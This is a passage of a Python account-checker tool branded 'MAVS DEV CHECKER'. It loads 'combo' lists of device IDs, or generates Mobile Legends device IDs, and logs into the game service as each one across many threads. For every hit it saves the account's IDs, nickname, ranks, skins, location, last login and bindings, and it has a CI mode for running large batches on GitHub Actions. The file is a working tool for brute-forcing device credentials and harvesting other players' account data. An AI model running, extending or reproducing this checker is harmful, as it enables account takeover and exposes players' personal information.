                'total_skins': self.total_skins,
                'level_count': self.level_count,
                'skin_count_records': self.skin_count_records,
                'max_level': self.max_level,
                'max_skins': self.max_skins,
            }

    def get_processed_count(self):
        with self.lock:
            return self.registered_count + self.unregistered_count + self.error_count

    def get_avg_level(self):
        with self.lock:
            return self.total_level / self.level_count if self.level_count > 0 else 0.0

    def get_avg_skins(self):
        with self.lock:
            return self.total_skins / self.skin_count_records if self.skin_count_records > 0 else 0.0

    def push_result(self, success: bool, is_registered: bool = False, error_reason: str = '',
                    full_info: dict = None):
        with self.lock:
            entry = {
                'success': success,
                'is_registered': is_registered,
                'error_reason': error_reason
            }
            if full_info:
                entry['full_info'] = full_info
            self.last_result_queue.append(entry)

    def pop_result(self):
        with self.lock:
            return self.last_result_queue.popleft() if self.last_result_queue else None

# ============================================================
# RESULTS MANAGER
# ============================================================

class ResultsManager:
    def __init__(self, combo_file_path, create_dirs=True, output_dir=None):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        if output_dir:
            self.base_dir = Path(output_dir)
        else:
            self.base_dir = Path(f'Results/{self.combo_file_name}_{self.timestamp}')
        if create_dirs:
            for sub in ('Registered', 'Unregistered', 'LookupErrors'):
                (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    def _format_full_info(self, account_data, index=1):
        device_id = str(account_data.get('device_id', 'N/A'))
        account_id = str(account_data.get('account_id', 'N/A'))
        zone_id = str(account_data.get('zone_id', 'N/A'))
        status = str(account_data.get('status', 'unknown'))
        is_registered = account_data.get('is_registered', False)
        player_data = account_data.get('player_data', {})
        lookup_status = account_data.get('lookup_status', 'N/A')

        lines = [
            '-' * 60,
            f'[{index}] DEVICE INFO',
            f'Device ID: {device_id}',
            f'Account ID: {account_id}',
            f'Zone ID: {zone_id}',
            f'Status: {"REGISTERED" if is_registered else "UNREGISTERED"}',
            f'Lookup: {lookup_status}',
            '-' * 60,
        ]

        if player_data and is_registered:
            lines.extend([
                'PLAYER INFO',
                f'Nickname: {player_data.get("nickname", "—")}',
                f'Level: {player_data.get("level", "—")}',
                f'Heroes: {player_data.get("hero_count", "—")}',
                f'Skins: {player_data.get("skin_count", "—")}',
                f'Current Rank: {player_data.get("current_rank", "—")}',
                f'Highest Rank: {player_data.get("high_rank", "—")}',
                f'Win Rate: {player_data.get("win_rate", "—")}%',
                f'Matches: {player_data.get("matches", "—")}',
                f'MVP: {player_data.get("mvp", "—")}',
                '-' * 60,
                'COLLECTION',
                f'Collector: {player_data.get("collector_tier", "—")}',
                f'Collector Pts: {player_data.get("collector_point", "—")}',
                f'Supreme: {player_data.get("skin_breakdown", {}).get("Supreme", "—")}',
                f'Grand: {player_data.get("skin_breakdown", {}).get("Grand", "—")}',
                f'Exquisite: {player_data.get("skin_breakdown", {}).get("Exquisite", "—")}',
                f'Deluxe: {player_data.get("skin_breakdown", {}).get("Deluxe", "—")}',
                f'Exceptional: {player_data.get("skin_breakdown", {}).get("Exceptional", "—")}',
                f'Common: {player_data.get("skin_breakdown", {}).get("Common", "—")}',
                '-' * 60,
                'OTHER INFO',
                f'Location: {player_data.get("location", "—")}',
                f'Last Login: {player_data.get("last_login", "—")}',
                f'Squad: {player_data.get("squad", "—")}',
                f'Bindings: {player_data.get("bindings", "—")}',
                f'Achievement Pts: {player_data.get("achievement_points", "—")}',
                '-' * 60,
            ])

        lines.append('')
        return '\n'.join(lines)

    def add_account(self, account_data):
        combo = str(account_data.get('device_id', 'N/A'))
        entry = self._format_full_info(account_data, index=self._next_index())
        timestamp = self.timestamp
        is_registered = account_data.get('is_registered', False)
        lookup_status = account_data.get('lookup_status', 'N/A')

        self._write_sorted(self.base_dir / f'All_Devices_{timestamp}.txt', entry)

        if is_registered:
            self._write_sorted(self.base_dir / 'Registered' / f'FullInfo_{timestamp}.txt', entry)
            self._append_line(self.base_dir / f'Registered_Accounts_{timestamp}.txt', combo)
            clean_line = f"Device ID: {combo} | Role ID: {account_data.get('account_id', 'N/A')} | Server ID: {account_data.get('zone_id', 'N/A')}"
            if account_data.get('player_data'):
                pd = account_data.get('player_data')
                clean_line += f" | Name: {pd.get('nickname', '—')} | Level: {pd.get('level', '—')} | Skins: {pd.get('skin_count', '—')}"
            self._append_line(self.base_dir / 'Registered' / f'Accounts_Clean_{timestamp}.txt', clean_line)
        else:
            self._write_sorted(self.base_dir / 'Unregistered' / f'Unregistered_{timestamp}.txt', entry)
            self._append_line(self.base_dir / f'Unregistered_Accounts_{timestamp}.txt', combo)

        if lookup_status == 'error':
            self._append_line(self.base_dir / 'LookupErrors' / f'lookup_errors_{timestamp}.txt',
                              f"{combo} | ERROR: {account_data.get('lookup_error', 'Unknown')}")

    def _write_sorted(self, filepath, new_entry_body, sort_by='device'):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with self._get_flock(filepath):
            entries = []
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                raw_entries = content.strip().split('\n' + '-' * 60 + '\n')
                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        if raw_entry.startswith('-' * 60):
                            raw_entry = raw_entry[len('-' * 60):].strip()
                        if raw_entry.endswith('-' * 60):
                            raw_entry = raw_entry[:-len('-' * 60)].strip()
                        if raw_entry:
                            entries.append(raw_entry)
            new_entry = new_entry_body.strip()
            if new_entry.startswith('-' * 60):
                new_entry = new_entry[len('-' * 60):].strip()
            if new_entry.endswith('-' * 60):
                new_entry = new_entry[:-len('-' * 60)].strip()
            if new_entry:
                entries.append(new_entry)
            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    if entry.strip():
                        f.write('-' * 60 + '\n')
                        f.write(entry.strip())
                        f.write('\n' + '-' * 60)
                        if i < len(entries) - 1:
                            f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

# ============================================================
# DEVICE LOOKUP
# ============================================================

_lookup_client = None
_lookup_lock = threading.Lock()

def get_lookup_client():
    global _lookup_client
    with _lookup_lock:
        if _lookup_client is None:
            _lookup_client = FullInfoLookup()
        return _lookup_client

def lookup_by_device_id(device_id):
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_success or not conn.is_registered:
                return {
                    'status': 'unregistered',
                    'device_id': device_id,
                    'message': 'UNREGISTERED',
                    'account_id': None,
                    'zone_id': None,
                    'is_registered': False
                }
            else:
                client = get_lookup_client()
                lookup_result = client.lookup(conn.account_id, conn.zone_id)
                result = {
                    'status': 'registered',
                    'device_id': device_id,
                    'account_id': conn.account_id,
                    'zone_id': conn.zone_id,
                    'message': f'REGISTERED | Account: {conn.account_id} Zone: {conn.zone_id}',
                    'is_registered': True
                }
                if lookup_result.get('status') == 'success':
                    result['lookup_status'] = 'success'
                    result['player_data'] = lookup_result.get('player_data', {})
                else:
                    result['lookup_status'] = 'error'
                    result['lookup_error'] = lookup_result.get('error', 'Unknown API error')
                    result['player_data'] = {}
                return result
    except ConnectionError as e:
        return {'status': 'error', 'error': f'Connection error: {str(e)}', 'device_id': device_id}
    except Exception as e:
        return {'status': 'error', 'error': f'Error: {str(e)}', 'device_id': device_id}

# ============================================================
# FILE MANAGER
# ============================================================

class AccountFileManager:
    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()

    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))

    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {
                'name': file_path.name,
                'path': str(file_path),
                'size': file_size,
                'size_str': self._format_size(file_size),
                'account_count': account_count
            }
        except Exception:
            return None

    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} TB'

    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                line = line.strip()
                if line:
                    cleaned_lines.append(line + '\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception:
            return (0, 0)

    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception:
            return 0

    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception:
            return False

    def save_devices_to_file(self, devices, filename):
        file_path = self.combo_folder / filename
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(devices))
        return file_path

# ============================================================
# AUTO-REMOVE HELPERS
# ============================================================

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(device_id, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(device_id)
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

# ============================================================
# PROCESS DEVICE
# ============================================================

def process_device(session, device_id, live_stats, results_manager, file_manager, combo_file_path, auto_remove, suppress_print=False):
    try:
        result = lookup_by_device_id(device_id)

        if result['status'] == 'error':
            live_stats.update_stats(is_error=True)
            results_manager.add_account({
                'device_id': device_id,
                'is_registered': False,
                'status': 'error',
                'error': result.get('error', 'Unknown error')
            })
            live_stats.push_result(success=False, error_reason=result.get('error', 'Error'))
            if not suppress_print:
                print_result('ERROR', device_id)
            if auto_remove:
                _queue_auto_remove(device_id, file_manager, combo_file_path)
            return 'ERROR'

        is_registered = result.get('is_registered', False)
        lookup_status = result.get('lookup_status', 'N/A')
        player_data = result.get('player_data', {})

        live_stats.update_stats(
            is_registered=is_registered,
            lookup_success=lookup_status == 'success',
            lookup_error=lookup_status == 'error'
        )

        if is_registered and lookup_status == 'success':
            live_stats.update_full_info(
                level=player_data.get('level'),
                skin_count=player_data.get('skin_count')
            )

        results_manager.add_account({
            'device_id': device_id,
            'is_registered': is_registered,
            'account_id': result.get('account_id'),
            'zone_id': result.get('zone_id'),
            'status': result['status'],
            'lookup_status': lookup_status,
            'lookup_error': result.get('lookup_error', ''),
            'player_data': player_data if is_registered else {}
        })

        live_stats.push_result(
            success=True,
            is_registered=is_registered,
            full_info=player_data if is_registered and lookup_status == 'success' else None
        )

        if not suppress_print:
            if is_registered:
                level = player_data.get('level') if player_data else None
                skin  = player_data.get('skin_count') if player_data else None
                print_result('HIT', device_id, level=level, skin=skin)
            else:
                print_result('INVALID', device_id)

        if auto_remove:
            _queue_auto_remove(device_id, file_manager, combo_file_path)

        return 'DONE'

    except Exception as e:
        live_stats.update_stats(is_error=True)
        results_manager.add_account({
            'device_id': device_id,
            'is_registered': False,
            'status': 'error',
            'error': str(e)
        })
        live_stats.push_result(success=False, error_reason=str(e))
        if not suppress_print:
            print_result('ERROR', device_id)
        if auto_remove:
            _queue_auto_remove(device_id, file_manager, combo_file_path)
        return 'ERROR'

# ============================================================
# UI HELPERS
# ============================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    clear_screen()
    banner_rows = [
        'M A V S   D E V',
        'C H E C K E R',
    ]
    sub = 'DEV ID VALIDATION SYSTEM'
    p('')
    p(f' {gradient_text("╭" + "─" * (_BW() - 2) + "╮", CYAN_C, PURPLE_C)}')
    p(f' {grow("", CYAN_C, PURPLE_C)}')
    for i, row in enumerate(banner_rows):
        t1 = lerp(0, 1, i / max(len(banner_rows) - 1, 1))
        cr = (lerp(CYAN_C[0],PURPLE_C[0],t1), lerp(CYAN_C[1],PURPLE_C[1],t1), lerp(CYAN_C[2],PURPLE_C[2],t1))
        cr2= (lerp(PURPLE_C[0],LAVENDER_C[0],t1), lerp(PURPLE_C[1],LAVENDER_C[1],t1), lerp(PURPLE_C[2],LAVENDER_C[2],t1))
        w   = _BW()
        vlen= len(row)
        lp  = (w - 4 - vlen) // 2
        rp  = (w - 4 - vlen) - lp
        p(f' {c_rgb(CYAN_C)}│{W_}{" " * (lp+1)}{gradient_text(row, cr, cr2)}{" " * (rp+1)}{c_rgb(PURPLE_C)}│{W_}')
    p(f' {grow("", CYAN_C, PURPLE_C)}')
    p(f' {gtitle(gradient_text(sub, GOLD_C, (255,160,40)), CYAN_C, PURPLE_C)}')
    p(f' {grow("", CYAN_C, PURPLE_C)}')
    p(f' {gradient_text("╰" + "─" * (_BW() - 2) + "╯", CYAN_C, PURPLE_C)}')
    p('')

def _select_file_menu(file_infos) -> str:
    p(f' {gtop()}')
    p(f' {gtitle(gradient_text("SELECT FILE", GOLD_C, (255,160,40)))}')
    p(f' {gmid()}')
    for idx, info in enumerate(file_infos, 1):
        cnt = f'{info["account_count"]:,} lines'
        row_text = (f'{c_rgb(GOLD_C)}{BD_}[{idx}]{W_} '
                    f'{c_rgb(WHITE_C)}{info["name"]}{W_}  '
                    f'{c_rgb(GRAY_C)}{cnt}{W_}')
        p(f' {grow(row_text)}')
    p(f' {grow("")}')
    p(f' {grow(f"{c_rgb(GRAY_C)}Type number or {c_rgb(GOLD_C)}auto{c_rgb(GRAY_C)} for largest{W_}")}')
    p(f' {gbot()}')
    p('')

    while True:
        try:
            raw = input(f' {c_rgb(CYAN_C)}◆{W_} ').strip().lower()
            if raw == 'auto':
                largest = max(file_infos, key=lambda x: x['account_count'])
                p(f'\n {c_rgb(GREEN_C)}{BD_}✓ Selected:{W_} '
                  f'{c_rgb(WHITE_C)}{largest["name"]}{W_}  '
                  f'{c_rgb(GRAY_C)}{largest["account_count"]:,} lines{W_}\n')
                return largest['path']
            idx = int(raw)
            if 1 <= idx <= len(file_infos):
                chosen = file_infos[idx - 1]
                p(f'\n {c_rgb(GREEN_C)}{BD_}✓ Selected:{W_} '
                  f'{c_rgb(WHITE_C)}{chosen["name"]}{W_}  '
                  f'{c_rgb(GRAY_C)}{chosen["account_count"]:,} lines{W_}\n')
                return chosen['path']
            p(f' {c_rgb(RED_C)}Enter 1–{len(file_infos)}.{W_}')
        except ValueError:
            p(f' {c_rgb(RED_C)}Enter a number.{W_}')

def _yes_no(prompt: str, default=True) -> bool:
    hint = 'Y/n' if default else 'y/N'
    while True:
        raw = input(f'  {_CY}{prompt} [{hint}]:{_RST} ').strip().lower()
        if not raw:
            return default
        if raw in ('y', 'yes'):
            return True
        if raw in ('n', 'no'):
            return False

_MENU_ITEMS = [
    ('1', 'SELECT FILE'),
    ('2', 'START CHECK'),
    ('3', 'GEN + CHECK'),
    ('4', 'EXIT'),
]

def _render_menu(selected_idx: int):
    display_banner()
    p(f' {gtop()}')
    p(f' {gtitle(gradient_text("MAIN MENU", GOLD_C, (255,160,40)))}')
    p(f' {gmid()}')
    p(f' {grow("")}')
    for idx, (_, label) in enumerate(_MENU_ITEMS):
        if idx == selected_idx:
            row_text = (f'{c_rgb(GOLD_C)}{BD_}◆ {label}{W_}')
        else:
            row_text = (f'{c_rgb(GRAY_C)}  {label}{W_}')
        p(f' {grow(row_text)}')
    p(f' {grow("")}')
    p(f' {gbot()}')
    p('')
    p(f' {c_rgb(GRAY_C)}↑ / ↓  Navigate   ENTER  Select   ESC  Exit{W_}')
    p('')

def display_main_menu() -> str:
    """Keyboard-navigable gradient menu. Returns '1'..'4'."""
    import sys, tty, termios

    def _getch():
        fd  = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
            if ch == '\x1b':
                ch2 = sys.stdin.read(1)
                ch3 = sys.stdin.read(1)
                return ch + ch2 + ch3
            return ch
        except Exception:
            return ''
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

    try:
        termios.tcgetattr(sys.stdin.fileno())
        tty_ok = True
    except Exception:
        tty_ok = False

    if not tty_ok:
        display_banner()
        p(f' {gtop()}')
        p(f' {gtitle(gradient_text("MAIN MENU", GOLD_C, (255,160,40)))}')
        p(f' {gmid()}')
        for key, label in _MENU_ITEMS:
            p(f' {grow(f"{c_rgb(GOLD_C)}{BD_}[{key}]{W_} {c_rgb(WHITE_C)}{label}{W_}")}')
        p(f' {gbot()}')
        p('')
        while True:
            try:
                ch = input(f' {c_rgb(CYAN_C)}◆{W_} ').strip()
                if ch in ('1', '2', '3', '4'):
                    return ch
                p(f' {c_rgb(RED_C)}Enter 1–4.{W_}')
            except KeyboardInterrupt:
                return '4'

    sel = 0
    _render_menu(sel)
    while True:
        try:
            ch = _getch()
        except KeyboardInterrupt:
            return '4'
        if   ch in ('\x1b[A', '\x1bOA'): sel = (sel - 1) % len(_MENU_ITEMS); _render_menu(sel)
        elif ch in ('\x1b[B', '\x1bOB'): sel = (sel + 1) % len(_MENU_ITEMS); _render_menu(sel)
        elif ch in ('\r', '\n', ' '):     return _MENU_ITEMS[sel][0]
        elif ch == '\x1b':               return '4'
        elif ch in ('1','2','3','4'):    return ch

# ============================================================
# BULK CHECK
# ============================================================

_selected_file = None
_selected_file_lock = threading.Lock()

def bulk_check():
    global valid_devices_list, _selected_file
    with valid_devices_lock:
        valid_devices_list = []

    file_manager = AccountFileManager()
    combo_files = file_manager.scan_combo_folder()

    if not combo_files:
        print(f'\n  {_RD}No combo files found in Combo/ folder.{_RST}\n')
        input(f'  {_DIM}Press Enter to return…{_RST} ')
        return

    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]

    if not file_infos:
        print(f'\n  {_RD}No valid combo files.{_RST}\n')
        input(f'  {_DIM}Press Enter to return…{_RST} ')
        return

    with _selected_file_lock:
        if _selected_file and Path(_selected_file).exists():
            use_prev = _yes_no(f'Use previously selected file ({Path(_selected_file).name})?', default=True)
            if not use_prev:
                _selected_file = _select_file_menu(file_infos)
        else:
            _selected_file = _select_file_menu(file_infos)
        selected_file = _selected_file

    if _yes_no('Clean file encoding?', default=True):
        valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
        print(f'  {_GN}Cleaned:{_RST} {valid_count} valid, {invalid_count} removed')

    if _yes_no('Remove duplicates?', default=False):
        removed = file_manager.clean_duplicates(selected_file)
        print(f'  {_GN}Removed:{_RST} {removed} duplicate(s)')

    auto_remove = _yes_no('Auto-remove checked lines?', default=False)
    print()

    device_ids = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                did = line.strip()
                if did:
                    device_ids.append(did)
    except Exception as e:
        print(f'  {_RD}Could not read file: {e}{_RST}\n')
        input(f'  {_DIM}Press Enter to return…{_RST} ')
        return

    if not device_ids:
        print(f'  {_RD}No valid device IDs found.{_RST}\n')
        input(f'  {_DIM}Press Enter to return…{_RST} ')
        return

    while True:
        try:
            raw = input(f'  {_CY}Threads 1-20 (default 5):{_RST} ').strip()
            num_threads = 5 if not raw else int(raw)
            if 1 <= num_threads <= 20:
                break
            print(f'  {_RD}Enter 1–20.{_RST}')
        except ValueError:
            print(f'  {_RD}Enter a number.{_RST}')

    fname = Path(selected_file).name
    p('')
    p(f' {gtop()}')
    p(f' {gtitle(gradient_text("MAVS DEV CHECKER", CYAN_C, PURPLE_C))}')
    p(f' {gmid()}')
    p(f' {grow(f"{c_rgb(GRAY_C)}FILE{W_}      : {c_rgb(WHITE_C)}{fname}{W_}")}')
    p(f' {grow(f"{c_rgb(GRAY_C)}TOTAL{W_}     : {c_rgb(CYAN_C)}{len(device_ids):,}{W_}")}')
    p(f' {grow(f"{c_rgb(GRAY_C)}THREADS{W_}   : {c_rgb(WHITE_C)}{num_threads}{W_}")}')
    p(f' {grow(f"{c_rgb(GREEN_C)}{BD_}STATUS{W_}    : CHECKING …{W_}")}')
    p(f' {gbot()}')
    p('')
    p(f' {gsep()}')
    p('')

    results_manager = ResultsManager(selected_file)
    live_stats = LiveStats()
    live_stats.total_accounts = len(device_ids)
    start_time = time.time()

    _thread_local = threading.local()

    def _get_session():
        if not hasattr(_thread_local, 'session'):
            _thread_local.session = requests.Session()
        return _thread_local.session

    def _worker(device_id):
        session = _get_session()
        status  = process_device(session, device_id, live_stats, results_manager,
                                 file_manager, selected_file, auto_remove, suppress_print=False)
        with output_lock:
            st = live_stats.get_stats()
            print_status_line(
                live_stats.get_processed_count(), len(device_ids),
                st['registered'], st['unregistered'], st['error'], start_time
            )
        return status

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(_worker, did): did for did in device_ids}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    except KeyboardInterrupt:
        p(f'\n {c_rgb(GOLD_C)}Interrupted by user.{W_}')

    _flush_auto_remove(file_manager, selected_file, force=True)

    elapsed = time.time() - start_time
    stats   = live_stats.get_stats()
    p('')
    p(f' {gsep()}')
    print_summary(
        total=len(device_ids),
        hits=stats['registered'],
        invalid=stats['unregistered'],
        errors=stats['error'],
        elapsed=elapsed
    )
    p(f' {c_rgb(GRAY_C)}Results saved → Results/{W_}')
    p('')
    input(f' {c_rgb(CYAN_C)}◆{W_} Press Enter to return… ')

# ============================================================
# SINGLE CHECK
# ============================================================

def single_check():
    global valid_devices_list
    with valid_devices_lock:
        valid_devices_list = []

    p(f' {c_rgb(GRAY_C)}Enter device ID to check (or "back" to return){W_}')
    p('')

    while True:
        device_id = input(f'  {_CY}Device ID:{_RST} ').strip()
        if not device_id:
            continue
        if device_id.lower() in ('back', 'exit', 'q'):
            return

        result = lookup_by_device_id(device_id)

        if result.get('is_registered'):
            add_valid_device(
                str(device_id),
                str(result.get('account_id', 'N/A')),
                str(result.get('zone_id', 'N/A')),
                result.get('player_data', {})
            )
            player_data = result.get('player_data', {})
            level = player_data.get('level') if player_data else None
            skin  = player_data.get('skin_count') if player_data else None
            print_result('HIT', device_id, level=level, skin=skin)
        elif result.get('status') == 'error':
            print_result('ERROR', device_id)
        else:
            print_result('INVALID', device_id)

        again = input(f'  {_CY}Check another? (y/n):{_RST} ').strip().lower()
        if again != 'y':
            break
        print()

# ============================================================
# GENERATE + CHECK
# ============================================================

def generate_and_check():
    global valid_devices_list
    with valid_devices_lock:
        valid_devices_list = []

    print(f'  {_DIM}GEN + CHECK — generate device IDs and check them{_RST}')
    print()

    while True:
        try:
            raw = input(f'  {_CY}Number of device IDs to generate (default 100):{_RST} ').strip()
            count = 100 if not raw else int(raw)
            if count > 0:
                break
            print(f'  {_RD}Must be greater than 0.{_RST}')
        except ValueError:
            print(f'  {_RD}Enter a valid number.{_RST}')

    while True:
        try:
            raw = input(f'  {_CY}Threads 1-20 (default 5):{_RST} ').strip()
            num_threads = 5 if not raw else int(raw)
            if 1 <= num_threads <= 20:
                break
            print(f'  {_RD}Enter 1–20.{_RST}')
        except ValueError:
            print(f'  {_RD}Enter a number.{_RST}')

    generator = MLBBDeviceIDGenerator()
    device_ids = generator.generate_smart(count)

    file_manager = AccountFileManager()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f'generated_{timestamp}.txt'
    file_path = file_manager.save_devices_to_file(device_ids, filename)

    p('')
    p(f' {gtop()}')
    p(f' {gtitle(gradient_text("MAVS DEV CHECKER", CYAN_C, PURPLE_C))}')
    p(f' {gmid()}')
    p(f' {grow(f"{c_rgb(GRAY_C)}FILE{W_}      : {c_rgb(WHITE_C)}{Path(file_path).name}{W_}")}')
    p(f' {grow(f"{c_rgb(GRAY_C)}TOTAL{W_}     : {c_rgb(CYAN_C)}{len(device_ids):,}{W_}")}')
    p(f' {grow(f"{c_rgb(GRAY_C)}THREADS{W_}   : {c_rgb(WHITE_C)}{num_threads}{W_}")}')
    p(f' {grow(f"{c_rgb(GREEN_C)}{BD_}STATUS{W_}    : CHECKING …{W_}")}')
    p(f' {gbot()}')
    p('')
    p(f' {gsep()}')
    p('')

    results_manager = ResultsManager(file_path)
    live_stats = LiveStats()
    live_stats.total_accounts = len(device_ids)
    start_time = time.time()

    _thread_local = threading.local()

    def _get_session():
        if not hasattr(_thread_local, 'session'):
            _thread_local.session = requests.Session()
        return _thread_local.session

    def _worker(device_id):
        session = _get_session()
        status  = process_device(session, device_id, live_stats, results_manager,
                                 file_manager, file_path, False, suppress_print=False)
        with output_lock:
            st = live_stats.get_stats()
            print_status_line(
                live_stats.get_processed_count(), len(device_ids),
                st['registered'], st['unregistered'], st['error'], start_time
            )
        return status

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(_worker, did): did for did in device_ids}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    except KeyboardInterrupt:
        p(f'\n {c_rgb(GOLD_C)}Interrupted by user.{W_}')

    elapsed = time.time() - start_time
    stats   = live_stats.get_stats()
    p('')
    p(f' {gsep()}')
    print_summary(
        total=len(device_ids),
        hits=stats['registered'],
        invalid=stats['unregistered'],
        errors=stats['error'],
        elapsed=elapsed
    )
    p(f' {c_rgb(GRAY_C)}Generated → {file_path}{W_}')
    p(f' {c_rgb(GRAY_C)}Results   → Results/{W_}')
    p('')
    input(f' {c_rgb(CYAN_C)}◆{W_} Press Enter to return… ')

# ============================================================
# CLI (NON-INTERACTIVE) MODE — for GitHub Actions / CI
# ============================================================

def run_cli_check(input_file: str, num_threads: int = 5,
                  output_dir: Optional[str] = None,
                  auto_remove: bool = False) -> int:
    """
    Non-interactive checker. Returns exit code (0 = success, 1 = error).

    Usage:
        python 67.py --file chunk_0.txt --threads 5 --output out/chunk_0
    """
    global _CLI_MODE
    _CLI_MODE = True

    # Make stdout line-buffered so CI logs stream promptly
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass

    input_path = Path(input_file).resolve()
    if not input_path.exists():
        print(f'ERROR: input file not found: {input_path}', flush=True)
        return 1

    print('MAVS DEV CHECKER — CLI MODE', flush=True)
    print(f'  Input   : {input_path}', flush=True)
    print(f'  Threads : {num_threads}', flush=True)
    print(f'  Output  : {output_dir or "auto (Results/…)"}', flush=True)
    print(f'  Remove  : {"yes" if auto_remove else "no"}', flush=True)
    print('-' * 60, flush=True)

    device_ids = []
    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                did = line.strip()
                if did:
                    device_ids.append(did)
    except Exception as e:
        print(f'ERROR: could not read file: {e}', flush=True)
        return 1

    if not device_ids:
        print('ERROR: no device IDs found in file.', flush=True)
        return 1

    print(f'Loaded {len(device_ids):,} device IDs', flush=True)
    print('-' * 60, flush=True)

    file_manager = AccountFileManager()
    results_manager = ResultsManager(str(input_path), output_dir=output_dir)
    print(f'Results dir: {results_manager.base_dir.resolve()}', flush=True)
    print('-' * 60, flush=True)

    live_stats = LiveStats()
    live_stats.total_accounts = len(device_ids)
    start_time = time.time()

    _thread_local = threading.local()

    def _get_session():
        if not hasattr(_thread_local, 'session'):
            _thread_local.session = requests.Session()
        return _thread_local.session

    def _worker(device_id):
        session = _get_session()
        status = process_device(
            session, device_id, live_stats, results_manager,
            file_manager, str(input_path), auto_remove,
            suppress_print=False
        )
        with output_lock:
            st = live_stats.get_stats()
            print_status_line(
                live_stats.get_processed_count(), len(device_ids),
                st['registered'], st['unregistered'], st['error'], start_time
            )
        return status

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(_worker, did): did for did in device_ids}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f'worker error: {e}', flush=True)
    except KeyboardInterrupt:
        print('\nInterrupted by user.', flush=True)

    if auto_remove:
        _flush_auto_remove(file_manager, str(input_path), force=True)

    elapsed = time.time() - start_time
    stats   = live_stats.get_stats()
    print_summary(
        total=len(device_ids),
        hits=stats['registered'],
        invalid=stats['unregistered'],
        errors=stats['error'],
        elapsed=elapsed,
    )
    print(f'RESULTS DIR: {results_manager.base_dir.resolve()}', flush=True)
    return 0

